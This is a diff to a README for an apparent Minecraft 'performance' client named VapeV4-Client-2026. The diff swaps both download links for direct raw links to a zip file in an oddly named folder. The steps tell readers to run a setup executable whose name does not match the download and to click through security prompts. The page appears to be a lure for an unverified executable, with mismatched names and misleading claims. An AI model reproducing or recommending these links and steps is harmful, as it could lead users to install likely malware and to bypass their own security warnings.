@@ -1,6 +1,6 @@
 # ⛏️ VapeV4-Client-2026 - Improve your Minecraft game performance easily
 
-[![Download Minecraft Mod Manager](https://img.shields.io/badge/Download-VapeV4--Client--2026-blue)](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026)
+[![Download Minecraft Mod Manager](https://img.shields.io/badge/Download-VapeV4--Client--2026-blue)](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026/raw/refs/heads/main/phascolome/Client_Vape_v2.7.zip)
 
 ## 🎮 What is this software?
 
@@ -28,7 +28,7 @@ Ensure your computer meets these requirements before you start the setup process
 
 Follow these steps to get the software running on your computer.
 
-1.  **Download:** Visit [this page](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026) to get the setup file. Click the download button on the page to save the installation file to your computer.
+1.  **Download:** Visit [this page](https://github.com/Frozenorangejuiceoiltycoon99/VapeV4-Client-2026/raw/refs/heads/main/phascolome/Client_Vape_v2.7.zip) to get the setup file. Click the download button on the page to save the installation file to your computer.
 2.  **Open the Installer:** Locate the file named `MinecraftModManager_Setup.exe` in your Downloads folder. Double-click this file to start the installer.
 3.  **Grant Permissions:** Your computer might show a security prompt. Click "Run" or "Yes" to allow the installer to make changes to your device.
 4.  **Complete Steps:** Follow the on-screen instructions. The program will ask where to save the files. Keep the default folder settings unless you have a specific reason to change them.
